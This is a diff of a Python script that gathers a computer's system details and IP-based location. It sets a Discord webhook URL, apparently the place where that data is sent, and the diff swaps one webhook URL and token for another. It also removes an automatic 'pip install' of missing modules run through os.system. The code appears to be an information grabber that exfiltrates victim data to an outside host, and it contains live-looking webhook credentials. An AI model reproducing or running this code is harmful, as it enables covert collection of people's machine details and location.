@@ -1,16 +1,12 @@
 import os
+from datetime import timedelta, datetime
+import platform
+import psutil
+import locale
+import time
+import json
+import requests
 
-try:
-    from datetime import timedelta, datetime
-    import platform
-    import psutil
-    import locale
-    import time
-    import json
-    import requests
-except ModuleNotFoundError as e:
-    missing_module = str(e).split("'")[1]
-    os.system(f"pip install {missing_module}")
 
 def get_system_info():
     info = {}
@@ -65,7 +61,7 @@ def get_ip_location():
     except requests.RequestException:
         return {"IP": "Unavailable", "City": "Unavailable", "Region": "Unavailable", "Country": "Unavailable"}
       
-WEBHOOK_URL = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1347607590649073686/RguSa7skv9Lw76unTbpfqd6LWmAEhCbN_tdLF31L2dOKsLkV6v5lNuej2faGImyvCTxL"
 
 ip = get_ip_location()
 sysinform = get_system_info()
